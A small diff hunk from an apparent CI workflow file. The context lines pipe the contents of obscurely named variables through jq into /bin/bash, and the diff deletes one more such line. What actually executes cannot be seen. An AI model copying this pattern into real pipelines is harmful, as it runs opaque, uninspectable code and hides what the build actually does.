@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$xzcoa98030" | jq -r .rc29108 | /bin/bash
           printf '%s' "$xohwa74602" | jq -r .mk9260 | /bin/bash
           echo $axhf2551 | jq -r .bwsu673 | /bin/bash
-          echo $hge814 | jq -r .hplq229 | /bin/bash
 
       - name: Persist output
         if: always()
